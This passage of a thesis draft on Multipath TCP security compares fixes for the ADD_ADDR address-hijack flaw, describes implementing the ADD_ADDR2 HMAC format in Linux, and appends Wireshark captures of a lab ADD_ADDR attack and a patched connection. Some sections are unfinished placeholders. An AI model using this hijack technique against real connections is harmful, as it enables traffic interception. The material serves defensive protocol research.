A possible solution could be to add the receiver token of the connection as a field in the ADD\_ADDR option. Such token, exchanged only during connection establishment via the MP\_CAPABLE option, is supposed to be unknown to the attacker that in turns would not be able to forge a valid ADD\_ADDR message. This solution wouldn't be effective if the attacker is able to eavesdrop the keys during the initial handshake; keys' eavesdrop is indeed a security concern related to MPTCP [ref to section on Keys' Eavesdrop], and for this reason it is not advisable to add such information in clear inside the ADD\_ADDR option, since that would give more opportunities for eavesdropping.
Another possibility would be to maintain the ADD\_ADDR format unchanged but to block the attack at a later stage. For example, if the destination address of the SYN packet is added as part of the message used to calculate the HMAC value, the attacker wouldn't be able to recompute the HMAC value after modifying the destination address. However, since addresses are not a stable piece of information in a network with NATs, using the destination address to calculate the HMAC might not work.
In order to achieve higher security levels maintaining NAT compatibility, a third option has been proposed with positive feedback. The idea is to add to the ADD\_ADDR option a new field containing the truncated HMAC value (rightmost 64 bits) calculated as follow: the \textit{key} is the MPTCP key of the sender as originally agreed in the MP\_CAPABLE handshake; the \textit{message} is the concatenation of the previous three fields in packet: Address ID, advertised IP address, and Port. The new format (figure \ref{fig:addaddr2} has been formally specified for the first time in \rfc{6824bis-04}.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.75\textwidth]{images/addaddr2}
\caption{ADD\_ADDR2 option}
\label{fig:addaddr2}
\end{figure}

Such format would require the attacker to know the key in order to forge a valid ADD\_ADDR2 message, but such key is not exposed as in the case of the previous solution. Albeit, if the attacker is able to eavesdrop the keys during connection initiation it would be possible to exploit the same vulnerability even with the new address format. More experiments about this case are reported in section [ref to the experimental evaluation section]. Possible mitigations for such threat are explained in section [ref to keys' eavesdrop section 3.3.2].

The keys' eavesdrop threat is a partial-time on-path eavesdrop, a category that is considered less critical in terms of security concerns. Such keys' eavesdrop procedure in MPTCP has an almost identical counterpart in SCTP, when the SCTP-AUTH extension is used without pre-shared keys [\rfc{5061}]. In these regards the same security levels of SCTP would be reached in MPTCP by upgrading ADD\_ADDR to ADD\_ADDR2. Since SCTP is Standard Track, ADD\_ADDR2 is indeed considered a sufficient modification of the MPTCP first design to reach the security levels required for the transition to Standard Track.


\section{Implementing ADD\_ADDR2}
An introductory section that shows the main architectural aspects of how MPTCP has been merged into the TCP code and the TCP modules inside the kernel.
Here it starts the part with all the details about the implementation of ADD\_ADDR2 in the kernel, as part of the work developed during the stage. Code snippets have to be added here. The following subsections are the side issues and side features that have been elaborated during the thesis work.

\subsection{Retro-compatibility}
Version control mechanism was not present but it is needed to negotiate which format to use in a MPTCP session: ADD\_ADDR or ADD\_ADDR2.

\subsection{Port advertisement}
Port advertisement in ADD\_ADDR is possible according to RFC specifications but it was not part of the implementation at the beginning of the thesis work, so it has been added.

\subsection{IPv6 considerations}
Longer addresses brought some issues related to TCP option fields limitations.

\subsection{Crypto-API in MPTCP}
A major problem was how to deal with the new hashing requirements introduced by ADD\_ADDR2. Extending the current MPTCP hashing function to deal with input messages of arbitrary size is a first point to explain. The second part has to deal with the whole analysis related to adopting the kernel CRYPTO APIs to calculate the HMAC values in MPTCP and why this is not advisable.

\section{Other contributions}
Another minor part of the thesis work on MPTCP is related to some small contributions to the official RFC documentation and other open-source projects.

\section{Experimental evaluation}
This part should include performance analysis regarding the new format introduced with ADD\_ADDR2. A discussion on how the new format (and all the other modifications introduced with the patches) could impact any aspect of the protocol should be present in this section.
It is possible to add here the other possible solutions for ADD\_ADDR fix, and why they are not good enough. 
\chapter{Conclusions}
\label{chap:conclusions}

\section{Ethical aspects and sustainability}
MPTCP might potentially have a huge impact on the connectivity performances for the most common services and applications currently available at global scale. In the interconnected reality of today, this means that MPTCP might have a tremendous impact on virtually any context involving a connected device, being that a personal smartphone or a single node in a big data center of a big corporation. 
However, performance is not the only metric to be prioritized when it comes to worldwide communication protocols and infrastructure: security and privacy are also major components in the area. From this perspective, working on the security evaluation of MPTCP has important implications regarding ethical concerns.
By splitting a logical flow of data into different subflows with no predictable scheduling pattern, perhaps involving different ISPs for different subflows, would make it so much harder to inspect and eavesdrop useful information by acting within the core of the Internet. Despite this might be seen as a potential benefit for clients aiming at achieving full anonymation, many current intrusion mechanism and similar might fail under these new circumstances, perhaps causing even more security threats.
Privacy has not been specifically mentioned in this paper, mainly focused on the security aspects of the protocols. However, it is important to remind the reader that the main goal for MPTCP is currently to achieve at least the same level of security of regular TCP; in other words it is required that MPTCP does not introduce new attacking vectors of relevant importance. MPTCP is not specifically thought to be an extension of TCP aimed at improve security and privacy for the people all over the world.

A somewhat more in-depth argumentation can be defined for the sustainability and environmental aspects related to MPTCP.
 

\section{Related work}
This thesis is focused on the development of the first implementation of ADD\_ADDR2. No other implementations for such new format have been released yet at the time of writing, even if the specifications for it are currently available in RFC draft documents. This work is closely related to the underlying specifications elaborated by the IETF working group and MPTCP maintainers. From a more general perspective, all the research carried out on the security aspects of MPTCP can be considered related work and this includes middleboxes testing, which is a parallel project active at the Intel office in Lund (Sweden) where this thesis work has been performed. 

\section{Future work}
\label{future}
This thesis workflow mainly involved actual development and testing. The final produced patches have been applied to the official Linux Kernel MPTCP repository, thus marking the first step towards the implementation of the new version of the protocol: MPTCP version 1. 
Both the implementation of MPTCP and the definition of the protocol's specifications are important works in progress for the Internet community. The introduced modifications in this thesis use \rfc{6824bis-04} as reference document, but during the last part of the working period a new RFC draft has been released (\rfc{6824bis-05}) with new MPTCP functionalities and a slightly different implementation of ADD\_ADDR2 as well. A future work will be to update the current ADD\_ADDR2 implementation to follow the new draft document's specifications, keeping in mind that the whole project is at a experimental stage and subjected to relatively frequent modifications.

Another open problem left by this work is the investigation about the Crypto APIs usage in MPTCP, a context that is also found in the SCTP protocol implementation for Linux: since Crypto-API is unsafe in atomic context, current SCTP code must be updated to cope with this aspect. If the problem is definitely solved for SCTP and Crypto-APIs are certified to be safe in SCTP, then it is possible adopt the same code elsewhere in the network components of Linux, including MPTCP. The positive aspect of switching to an already available and established set of cryptographic functions include code re-usability and modularity. Performance comparisons should be investigated as well.

Future work includes the updating of the networking tools in order to be compatible with the new format of ADD\_ADDR. Examples for this have been shown in the thesis for Wireshark and the Nimai's MPTCP-compatible Scapy tool.

Lastly, it is worth mentioning that this paper is focused on the ADD\_ADDR vulnerability, but other threats have been detected for MPTCP. Security concerns will remain one of the main aspects to be investigated and verified during the development phase of MPTCP, so that all the minimum requirements are met before the protocol is added to the public Linux Kernel. This thesis only marginally mention other security implications other than ADD\_ADDR. Moreover, the experimental evaluation reported in this paper addresses the flooding attack considerations related to ADD\_ADDR2, but further studies should be carried out regarding the new format to assess that it does not indeed introduce new attacking vectors or unexpected performance degradation in MPTCP.

\chapter{ADD\_ADDR attack capture}
\label{app:a}

This appendix contains the capture file for the ADD\_ADDR attack execution as described in chapter \ref{chap:addaddrattackexecution}. This capture is obtained by monitoring \textit{tap0} (targeted interface) and trimmed to just show the TCP flags and the MPTCP options exchanged in signaling packets.

\begingroup
    \fontsize{8pt}{9pt}\selectfont
	\begin{verbatim}
...
Frame 2: 86 bytes on wire (688 bits), 86 bytes captured (688 bits)
Ethernet II, Src: 36:92:62:7e:a3:aa (36:92:62:7e:a3:aa), Dst: a6:34:88:29:79:30 (a6:34:88:29:79:30)
Internet Protocol Version 4, Src: 10.1.1.2, Dst: 10.2.1.2
Transmission Control Protocol, Src Port: 59297, Dst Port: 33443, Seq: 0, Len: 0
    ...
    Flags: 0x002 (SYN)
    ...
        Multipath TCP: Multipath Capable
            Kind: Multipath TCP (30)
            Length: 12
            0000 .... = Multipath TCP subtype: Multipath Capable (0)
            .... 0000 = Multipath TCP version: 0
            Multipath TCP flags: 0x81
                1... .... = Checksum required: 1
                .0.. .... = Extensibility: 0
                .... ...1 = Use HMAC-SHA1: 1
                ..00 000. = Reserved: 0x00
            Sender's Key: 16701209312697411725
    ...

Frame 3: 86 bytes on wire (688 bits), 86 bytes captured (688 bits)
Ethernet II, Src: a6:34:88:29:79:30 (a6:34:88:29:79:30), Dst: 36:92:62:7e:a3:aa (36:92:62:7e:a3:aa)
Internet Protocol Version 4, Src: 10.2.1.2, Dst: 10.1.1.2
Transmission Control Protocol, Src Port: 33443, Dst Port: 59297, Seq: 0, Ack: 1, Len: 0
    ...
    Flags: 0x012 (SYN, ACK)
    ...
        Multipath TCP: Multipath Capable
            Kind: Multipath TCP (30)
            Length: 12
            0000 .... = Multipath TCP subtype: Multipath Capable (0)
            .... 0000 = Multipath TCP version: 0
            Multipath TCP flags: 0x81
                1... .... = Checksum required: 1
                .0.. .... = Extensibility: 0
                .... ...1 = Use HMAC-SHA1: 1
                ..00 000. = Reserved: 0x00
            Sender's Key: 1243510374397414024
    ...

Frame 4: 94 bytes on wire (752 bits), 94 bytes captured (752 bits)
Ethernet II, Src: 36:92:62:7e:a3:aa (36:92:62:7e:a3:aa), Dst: a6:34:88:29:79:30 (a6:34:88:29:79:30)
Internet Protocol Version 4, Src: 10.1.1.2, Dst: 10.2.1.2
Transmission Control Protocol, Src Port: 59297, Dst Port: 33443, Seq: 1, Ack: 1, Len: 0
    ...
    Flags: 0x010 (ACK)
    ...
        Multipath TCP: Multipath Capable
            Kind: Multipath TCP (30)
            Length: 20
            0000 .... = Multipath TCP subtype: Multipath Capable (0)
            .... 0000 = Multipath TCP version: 0
            Multipath TCP flags: 0x81
                1... .... = Checksum required: 1
                .0.. .... = Extensibility: 0
                .... ...1 = Use HMAC-SHA1: 1
                ..00 000. = Reserved: 0x00
            Sender's Key: 16701209312697411725
    ...

Frame 5: 87 bytes on wire (696 bits), 87 bytes captured (696 bits)
Ethernet II, Src: 36:92:62:7e:a3:aa (36:92:62:7e:a3:aa), Dst: a6:34:88:29:79:30 (a6:34:88:29:79:30)
Internet Protocol Version 4, Src: 10.1.1.2, Dst: 10.2.1.2
Transmission Control Protocol, Src Port: 59297, Dst Port: 33443, Seq: 1, Ack: 1, Len: 1
    ...
    Flags: 0x018 (PSH, ACK)
    ...
        Multipath TCP: Data Sequence Signal
            Kind: Multipath TCP (30)
            Length: 20
            0010 .... = Multipath TCP subtype: Data Sequence Signal (2)
            Multipath TCP flags: 0x05
                ...0 .... = DATA_FIN: 0
                .... 0... = Data Sequence Number is 8 octets: 0
                .... .1.. = Data Sequence Number, Subflow Sequence Number, Data-level Length, Checksum present: 1
                .... ..0. = Data ACK is 8 octets: 0
                .... ...1 = Data ACK is present: 1
            Original MPTCP Data ACK: 2078391628
            Data Sequence Number: 2995440535  (32bits version)
            Subflow Sequence Number: 1
            Data-level Length: 1
    ...

...

Frame 21: 62 bytes on wire (496 bits), 62 bytes captured (496 bits)
Ethernet II, Src: a6:34:88:29:79:30 (a6:34:88:29:79:30), Dst: 36:92:62:7e:a3:aa (36:92:62:7e:a3:aa)
Internet Protocol Version 4, Src: 10.2.1.2, Dst: 10.1.1.2
Transmission Control Protocol, Src Port: 33443, Dst Port: 59297, Seq: 1004, Ack: 4294966299, Len: 0
    ...
    Flags: 0x010 (ACK)
    ...
        Multipath TCP: Add Address
            Kind: Multipath TCP (30)
            Length: 8
            0011 .... = Multipath TCP subtype: Add Address (3)
            .... 0100 = IP version: 4
            Address ID: 6
            Advertised IPv4 Address: 10.1.1.1
    ...

Frame 22: 86 bytes on wire (688 bits), 86 bytes captured (688 bits)
Ethernet II, Src: 36:92:62:7e:a3:aa (36:92:62:7e:a3:aa), Dst: a6:34:88:29:79:30 (a6:34:88:29:79:30)
Internet Protocol Version 4, Src: 10.1.1.2, Dst: 10.1.1.1
Transmission Control Protocol, Src Port: 53953, Dst Port: 33443, Seq: 0, Len: 0
    ...
    Flags: 0x002 (SYN)
    ...
        Multipath TCP: Join Connection
            Kind: Multipath TCP (30)
            Length: 12
            0001 .... = Multipath TCP subtype: Join Connection (1)
            Multipath TCP flags: 0x10
                ...1 .... = Backup flag: 1
            Address ID: 2
            Receiver's Token: 1242546132
            Sender's Random Number: 3113663070
    ...

... [TCP Retranmission here]

Frame 24: 90 bytes on wire (720 bits), 90 bytes captured (720 bits)
Ethernet II, Src: a6:34:88:29:79:30 (a6:34:88:29:79:30), Dst: 36:92:62:7e:a3:aa (36:92:62:7e:a3:aa)
Internet Protocol Version 4, Src: 10.1.1.1, Dst: 10.1.1.2
Transmission Control Protocol, Src Port: 33443, Dst Port: 53953, Seq: 0, Ack: 1, Len: 0
    ...
    Flags: 0x012 (SYN, ACK)
    ...
        Multipath TCP: Join Connection
            Kind: Multipath TCP (30)
            Length: 16
            0001 .... = Multipath TCP subtype: Join Connection (1)
            Multipath TCP flags: 0x10
                ...1 .... = Backup flag: 1
            Address ID: 4098
            Sender's Truncated HMAC: 2867407674975684266
            Sender's Random Number: 1275303205
    ...

Frame 25: 90 bytes on wire (720 bits), 90 bytes captured (720 bits)
Ethernet II, Src: 36:92:62:7e:a3:aa (36:92:62:7e:a3:aa), Dst: a6:34:88:29:79:30 (a6:34:88:29:79:30)
Internet Protocol Version 4, Src: 10.1.1.2, Dst: 10.1.1.1
Transmission Control Protocol, Src Port: 53953, Dst Port: 33443, Seq: 1, Ack: 1, Len: 0
    ...
    Flags: 0x010 (ACK)
    ...
        Multipath TCP: Join Connection
            Kind: Multipath TCP (30)
            Length: 24
            0001 .... = Multipath TCP subtype: Join Connection (1)
            .... 0000 0000 0000 = Reserved: 0x0000
            Sender's HMAC: 20767a5fd16ca5a23e652f78620883acfbca2590
    ...

...

Frame 30: 54 bytes on wire (432 bits), 54 bytes captured (432 bits)
Ethernet II, Src: a6:34:88:29:79:30 (a6:34:88:29:79:30), Dst: 36:92:62:7e:a3:aa (36:92:62:7e:a3:aa)
Internet Protocol Version 4, Src: 10.2.1.2, Dst: 10.1.1.2
Transmission Control Protocol, Src Port: 33443, Dst Port: 59297, Seq: 4, Len: 0
    ...
    Flags: 0x004 (RST)
    ...
	\end{verbatim}
\endgroup
\chapter{MPTCP version 1 capture}
\label{app:b}

This appendix contains the first 10 packets of a MPTCP connection between two UML virtual machines using the IPv6 network scenario shown in figure \ref{fig:netip6_2}. The MPTCP version in use includes the set of patches developed during the thesis work (compliant with \rfc{6824bis-04}), such as version control (set to 1, as shown in the first three frames related to the MP\_CAPABLE handshake) and ADD\_ADDR2 (the truncated HMAC value is present in frame 4). The main purpose of this capture file is to show the proper functioning of the patches introduced during the thesis work.

The capture file is generated with the Wireshark tool made compatible with ADD\_ADDR2, and the displayed content is trimmed to just show the TCP flags and the MPTCP options exchanged in signaling packets. This capture is obtained by monitoring \textit{tap0}.

\begingroup
    \fontsize{8pt}{9pt}\selectfont
	\begin{verbatim}
Frame 1: 106 bytes on wire (848 bits), 106 bytes captured (848 bits) on interface 0
Ethernet II, Src: c6:c3:59:b0:f2:e6 (c6:c3:59:b0:f2:e6), Dst: 4e:7f:57:76:1a:e4 (4e:7f:57:76:1a:e4)
Internet Protocol Version 6, Src: 1000:1:1::2, Dst: 1000:2:1::2
Transmission Control Protocol, Src Port: 59883, Dst Port: 5001, Seq: 0, Len: 0
    ...
    Flags: 0x002 (SYN)
    ...
        Multipath TCP: Multipath Capable
            Kind: Multipath TCP (30)
            Length: 12
            0000 .... = Multipath TCP subtype: Multipath Capable (0)
            .... 0001 = Multipath TCP version: 1
            Multipath TCP flags: 0x81
                1... .... = Checksum required: 1
                .0.. .... = Extensibility: 0
                .... ...1 = Use HMAC-SHA1: 1
                ..00 000. = Reserved: 0x00
            Sender's Key: 5002747019653015322
    ...
----------------------------------------------------------------------------------------------------
Frame 2: 106 bytes on wire (848 bits), 106 bytes captured (848 bits) on interface 0
Ethernet II, Src: 4e:7f:57:76:1a:e4 (4e:7f:57:76:1a:e4), Dst: c6:c3:59:b0:f2:e6 (c6:c3:59:b0:f2:e6)
Internet Protocol Version 6, Src: 1000:2:1::2, Dst: 1000:1:1::2
Transmission Control Protocol, Src Port: 5001, Dst Port: 59883, Seq: 0, Ack: 1, Len: 0
    ...
    Flags: 0x012 (SYN, ACK)
    ...
        Multipath TCP: Multipath Capable
            Kind: Multipath TCP (30)
            Length: 12
            0000 .... = Multipath TCP subtype: Multipath Capable (0)
            .... 0001 = Multipath TCP version: 1
            Multipath TCP flags: 0x81
                1... .... = Checksum required: 1
                .0.. .... = Extensibility: 0
                .... ...1 = Use HMAC-SHA1: 1
                ..00 000. = Reserved: 0x00
            Sender's Key: 9989746376998273982
    ...
----------------------------------------------------------------------------------------------------
Frame 3: 114 bytes on wire (912 bits), 114 bytes captured (912 bits) on interface 0
Ethernet II, Src: c6:c3:59:b0:f2:e6 (c6:c3:59:b0:f2:e6), Dst: 4e:7f:57:76:1a:e4 (4e:7f:57:76:1a:e4)
Internet Protocol Version 6, Src: 1000:1:1::2, Dst: 1000:2:1::2
Transmission Control Protocol, Src Port: 59883, Dst Port: 5001, Seq: 1, Ack: 1, Len: 0
    ...
    Flags: 0x010 (ACK)
    ...
        Multipath TCP: Multipath Capable
            Kind: Multipath TCP (30)
            Length: 20
            0000 .... = Multipath TCP subtype: Multipath Capable (0)
            .... 0001 = Multipath TCP version: 1
            Multipath TCP flags: 0x81
                1... .... = Checksum required: 1
                .0.. .... = Extensibility: 0
                .... ...1 = Use HMAC-SHA1: 1
                ..00 000. = Reserved: 0x00
            Sender's Key: 5002747019653015322
            Receiver's Key: 9989746376998273982
        Multipath TCP: Data Sequence Signal
            Kind: Multipath TCP (30)
            Length: 8
            0010 .... = Multipath TCP subtype: Data Sequence Signal (2)
            Multipath TCP flags: 0x01
                ...0 .... = DATA_FIN: 0
                .... 0... = Data Sequence Number is 8 octets: 0
                .... .0.. = Data Sequence Number, Subflow Sequence Number, Data-level Length, Checksum present: 0
                .... ..0. = Data ACK is 8 octets: 0
                .... ...1 = Data ACK is present: 1
            Original MPTCP Data ACK: 872094606
    ...
----------------------------------------------------------------------------------------------------
Frame 4: 114 bytes on wire (912 bits), 114 bytes captured (912 bits) on interface 0
Ethernet II, Src: 4e:7f:57:76:1a:e4 (4e:7f:57:76:1a:e4), Dst: c6:c3:59:b0:f2:e6 (c6:c3:59:b0:f2:e6)
Internet Protocol Version 6, Src: 1000:2:1::2, Dst: 1000:1:1::2
Transmission Control Protocol, Src Port: 5001, Dst Port: 59883, Seq: 1, Ack: 1, Len: 0
    ...
    Flags: 0x010 (ACK)
    ...
        Multipath TCP: Add Address
            Kind: Multipath TCP (30)
            Length: 28
            0011 .... = Multipath TCP subtype: Add Address (3)
            .... 0110 = IP version: 6
            Address ID: 8
            Advertised IPv6 Address: 1000:2:2::2
            Truncated HMAC: 7594364714824743626
    ...
----------------------------------------------------------------------------------------------------
Frame 5: 130 bytes on wire (1040 bits), 130 bytes captured (1040 bits) on interface 0
Ethernet II, Src: c6:c3:59:b0:f2:e6 (c6:c3:59:b0:f2:e6), Dst: 4e:7f:57:76:1a:e4 (4e:7f:57:76:1a:e4)
Internet Protocol Version 6, Src: 1000:1:1::2, Dst: 1000:2:1::2
Transmission Control Protocol, Src Port: 59883, Dst Port: 5001, Seq: 1, Ack: 1, Len: 24
    ...
    Flags: 0x018 (PSH, ACK)
    ...
        Multipath TCP: Data Sequence Signal
            Kind: Multipath TCP (30)
            Length: 20
            0010 .... = Multipath TCP subtype: Data Sequence Signal (2)
            Multipath TCP flags: 0x05
                ...0 .... = DATA_FIN: 0
                .... 0... = Data Sequence Number is 8 octets: 0
                .... .1.. = Data Sequence Number, Subflow Sequence Number, Data-level Length, Checksum present: 1
                .... ..0. = Data ACK is 8 octets: 0
                .... ...1 = Data ACK is present: 1
            Original MPTCP Data ACK: 872094606
            Data Sequence Number: 3712008769  (32bits version)
            Subflow Sequence Number: 1
            Data-level Length: 24
    ...
----------------------------------------------------------------------------------------------------
Frame 6: 94 bytes on wire (752 bits), 94 bytes captured (752 bits) on interface 0
Ethernet II, Src: 4e:7f:57:76:1a:e4 (4e:7f:57:76:1a:e4), Dst: c6:c3:59:b0:f2:e6 (c6:c3:59:b0:f2:e6)
Internet Protocol Version 6, Src: 1000:2:1::2, Dst: 1000:1:1::2
Transmission Control Protocol, Src Port: 5001, Dst Port: 59883, Seq: 1, Ack: 25, Len: 0
    ...
    Flags: 0x010 (ACK)
    ...
        Multipath TCP: Data Sequence Signal
            Kind: Multipath TCP (30)
            Length: 8
            0010 .... = Multipath TCP subtype: Data Sequence Signal (2)
            Multipath TCP flags: 0x01
                ...0 .... = DATA_FIN: 0
                .... 0... = Data Sequence Number is 8 octets: 0
                .... .0.. = Data Sequence Number, Subflow Sequence Number, Data-level Length, Checksum present: 0
                .... ..0. = Data ACK is 8 octets: 0
                .... ...1 = Data ACK is present: 1
            Original MPTCP Data ACK: 3712008793
    ...
----------------------------------------------------------------------------------------------------
Frame 7: 106 bytes on wire (848 bits), 106 bytes captured (848 bits) on interface 0
Ethernet II, Src: c6:c3:59:b0:f2:e6 (c6:c3:59:b0:f2:e6), Dst: 4e:7f:57:76:1a:e4 (4e:7f:57:76:1a:e4)
Internet Protocol Version 6, Src: 1000:1:1::2, Dst: 1000:2:2::2
Transmission Control Protocol, Src Port: 45840, Dst Port: 5001, Seq: 0, Len: 0
    ...
    Flags: 0x002 (SYN)
    ...
        Multipath TCP: Join Connection
            Kind: Multipath TCP (30)
            Length: 12
            0001 .... = Multipath TCP subtype: Join Connection (1)
            Multipath TCP flags: 0x10
                ...1 .... = Backup flag: 1
            Address ID: 8
            Receiver's Token: 4008023058
            Sender's Random Number: 4053633689
    ...
----------------------------------------------------------------------------------------------------
Frame 8: 110 bytes on wire (880 bits), 110 bytes captured (880 bits) on interface 0
Ethernet II, Src: 4e:7f:57:76:1a:e4 (4e:7f:57:76:1a:e4), Dst: c6:c3:59:b0:f2:e6 (c6:c3:59:b0:f2:e6)
Internet Protocol Version 6, Src: 1000:2:2::2, Dst: 1000:1:1::2
Transmission Control Protocol, Src Port: 5001, Dst Port: 45840, Seq: 0, Ack: 1, Len: 0
    ...
    Flags: 0x012 (SYN, ACK)
    ...
        Multipath TCP: Join Connection
            Kind: Multipath TCP (30)
            Length: 16
            0001 .... = Multipath TCP subtype: Join Connection (1)
            Multipath TCP flags: 0x10
                ...1 .... = Backup flag: 1
            Address ID: 4104
            Sender's Truncated HMAC: 16644964641649406387
            Sender's Random Number: 3923749318
    ...
----------------------------------------------------------------------------------------------------
Frame 9: 110 bytes on wire (880 bits), 110 bytes captured (880 bits) on interface 0
Ethernet II, Src: c6:c3:59:b0:f2:e6 (c6:c3:59:b0:f2:e6), Dst: 4e:7f:57:76:1a:e4 (4e:7f:57:76:1a:e4)
Internet Protocol Version 6, Src: 1000:1:1::2, Dst: 1000:2:2::2
Transmission Control Protocol, Src Port: 45840, Dst Port: 5001, Seq: 1, Ack: 1, Len: 0
    ...
    Flags: 0x010 (ACK)
    ...
        Multipath TCP: Join Connection
            Kind: Multipath TCP (30)
            Length: 24
            0001 .... = Multipath TCP subtype: Join Connection (1)
            .... 0000 0000 0000 = Reserved: 0x0000
            Sender's HMAC: 95d50d4aa4861fb5adccd0b92017622fa0275f29
    ...
----------------------------------------------------------------------------------------------------
Frame 10: 94 bytes on wire (752 bits), 94 bytes captured (752 bits) on interface 0
Ethernet II, Src: 4e:7f:57:76:1a:e4 (4e:7f:57:76:1a:e4), Dst: c6:c3:59:b0:f2:e6 (c6:c3:59:b0:f2:e6)
Internet Protocol Version 6, Src: 1000:2:2::2, Dst: 1000:1:1::2
Transmission Control Protocol, Src Port: 5001, Dst Port: 45840, Seq: 1, Ack: 1, Len: 0
    ...
    Flags: 0x010 (ACK)
    ...
        Multipath TCP: Data Sequence Signal
            Kind: Multipath TCP (30)
            Length: 8
            0010 .... = Multipath TCP subtype: Data Sequence Signal (2)
            Multipath TCP flags: 0x01
                ...0 .... = DATA_FIN: 0
                .... 0... = Data Sequence Number is 8 octets: 0
                .... .0.. = Data Sequence Number, Subflow Sequence Number, Data-level Length, Checksum present: 0
                .... ..0. = Data ACK is 8 octets: 0
                .... ...1 = Data ACK is present: 1
            Original MPTCP Data ACK: 3712008793
    ...

	\end{verbatim}
\endgroup

\begin{thebibliography}{99}

\bibitem{rfc793}
J. Postel,
``Transmission Control Protocol'',
\rfc{793}, 1981

\bibitem{internetlivestats}
Internet Live Stats,
\url{http://www.internetlivestats.com/internet-users}

\bibitem{cisco}
Cisco, Visual Networking Index (VNI),
\url{http://www.cisco.com/c/en/us/solutions/service-provider/visual-networking-index-vni/index.html#~complete-forecast}

\bibitem{computerworld}
L. Copeland, TCP/IP,
\url{http://www.computerworld.com/article/2593612/networking/tcp-ip.html}

\bibitem{rfc2460}
S. E. Deering, R. M. Hinden,
`` Internet Protocol, Version 6 (IPv6) Specification'',
\rfc{2460}, 1998

\bibitem{google}
Google, IPv6 Adoption Statistics,
\url{http://www.google.com/intl/en/ipv6/statistics.html#tab=ipv6-adoption&tab=ipv6-adoption}

\bibitem{rfc6824}
A. Ford, C. Raiciu, M. Handley, O. Bonaventure,
``TCP Extensions for Multipath Operation with Multiple Addresses'',
\rfc{6824}, January 2013

\bibitem{DBLP:journals/corr/QadirAYSC15}
J. Qadir, A. Ali, K.{-}L. A. Yau, A. Sathiaseelan, J. Crowcroft, 
``Exploiting the power of multiplicity: a holistic survey of network-layer multipath'',
CoRR,
abs/1502.02111,
March 2015,
\doi{10.1109/COMST.2015.2453941}

\bibitem{osi}
Microsoft, The OSI Model's Seven Layers Defined and Functions Explained,
\url{https://support.microsoft.com/en-us/kb/103884}

\bibitem{Yuchung}
Y. Cheng, Let's make TCP faster,
\url{http://googledevelopers.blogspot.de/2012/01/let-make-tcp-faster.html}

\bibitem{thenetworkway}
N. Yechiel, An Overview of Link Aggregation and LACP
\url{https://thenetworkway.wordpress.com/2015/05/01/an-overview-of-link-aggregation-and-lacp}

\bibitem{rfc5944}
C. Perkins,
``IP Mobility Support for IPv4, Revised'',
\rfc{5944},  November 2010

\bibitem{rfc5533}
E. Nordmark,  M. Bagnulo,
``Shim6: Level 3 Multihoming Shim Protocol for IPv6'',
\rfc{5533},  June 2009

\bibitem{rfc4960}
R. Stewart,
``Stream Control Transmission Protocol'',
\rfc{4960},  September 2007

\bibitem{ipspace}
I. Pepelnjak, What went wrong: SCTP
\url{http://blog.ipspace.net/2009/08/what-went-wrong-sctp.html}

\bibitem{rfc7430}
M. Bagnulo, C. Paasch, F. Gont, O. Bonaventure, C. Raiciu,
``Analysis of Residual Threats and Possible Fixes for Multipath TCP (MPTCP)'',
\rfc{7430},  July 2015

\bibitem{rfc6182}
A. Ford, C. Raiciu, M. Handley, S. Barre, J. Iyengar,
``Architectural Guidelines for Multipath TCP Development'',
\rfc{6182},  March 2011

\bibitem{rfc6356}
C. Raiciu, M. Handley, D. Wischik,
``Coupled Congestion Control for Multipath Transport Protocols'',
\rfc{6356},  October 2011

\bibitem{rfc4634}
D. E. Eastlake, T. Hansen,
``US Secure Hash Algorithms (SHA and HMAC-SHA)'',
\rfc{4634},  July 2006

\bibitem{HDPDB13}
B. Hesmans, F. Duchene, C. Paasch, G. Detal, O. Bonaventure, 
``Are TCP Extensions Middlebox-proof?'',
Proceedings of the 2013 Workshop on Hot Topics in Middleboxes and Network Function Virtualization, 
HotMiddlebox '13,
2015,
\doi{10.1145/2535828.2535830}

\bibitem{RPBFHDBH12}
C. Raiciu, C. Paasch, S. Barr{\'e}, A. Ford, M. Honda, F. Duchene, O. Bonaventure, M. Handley, 
``How Hard Can It Be? Designing and Implementing a Deployable Multipath TCP'',
Proceedings of the 9th USENIX Conference on Networked Systems Design and Implementation,
San Jose, CA, 2012 
pp.\ 29--29, 

\bibitem{2014:2578508} 
C. Paasch, O. Bonaventure, 
``Multipath TCP'', 
Queue, 
Vol.\ 12, No.\ 2, 
February 2014,
pp.\ 40-51,
\doi{10.1145/2578508.2591369}

\bibitem{eardley-mptcp-implementations-survey-02} 
P. Eardley,
``Survey of MPTCP Implementations'',
\url{https://tools.ietf.org/html/draft-eardley-mptcp-implementations-survey-02}, January 2014

\bibitem{caia}
Centre for Advanced Internet Architectures (CAIA), Multipath TCP
\url{http://caia.swin.edu.au/urp/newtcp/mptcp/tools.html}

\bibitem{netscalar}
J. Gudmundson, Maximize mobile user experience with NetScaler Multipath TCP
\url{https://www.citrix.com/blogs/2013/05/28/maximize-mobile-user-experience-with-netscaler-multipath-tcp/}

\bibitem{mptcpandroid}
MultiPath TCP - Linux Kernel implementation (Android Users)
\url{https://multipath-tcp.org/pmwiki.php?n=Users.Android}

\bibitem{mptcpsolaris}
[multipathtcp] Some comments on RFC 6824
\url{https://mailarchive.ietf.org/arch/msg/multipathtcp/ugMIu566McQMn8YCju-CTjW9beY}

\bibitem{apple}
iOS: Multipath TCP Support in iOS 7
\url{https://support.apple.com/en-us/HT201373}

\bibitem{osx}
K. Pearce, MPTCP Roams Free (By Default!) - OS X Yosemite
\url{http://labs.neohapsis.com/author/katepearcenz/}

\bibitem{DBLP:conf/fia/2010}
G. Tselentis, A. Galis, A. Gavras, S. Krco, V. Lotz, E. P. B. Simperl, B. Stiller, T. B. Zahariadis, 
``Towards the Future Internet - Emerging Trends from European Research'',
pp.\ 21--23,
IOS press, 2010,
ISBN: 978-1-60750-538-9

\bibitem{Raiciu:2011:IDP:2043164.2018467} 
C. Raiciu, S. Barr{\'e}, C. Pluntke, A. Greenhalgh, D. Wischik, M. Handley,
``Improving Datacenter Performance and Robustness with Multipath TCP'', 
SIGCOMM Comput. Commun. Rev., 
Vol.\ 41, No.\ 4,
August 2011, 
pp.\ 266-277,
\doi{10.1145/2043164.2018467}

\bibitem{HTSB15} 
B. Hesmans, H. Tran-Viet, R. Sadre, O. Bonaventure, 
``A First Look at Real Multipath TCP Traffic'',
Traffic Monitoring and Analysis,
2015,

\bibitem{dashboard} 
Deployment of MPTCP-enabled hosts in the Alexa top-1M list,
\url{https://academic-network-security.research.nicta.com.au/mptcp/deployment/}

\bibitem{Mehani:2015:ELM:2798087.2798088}
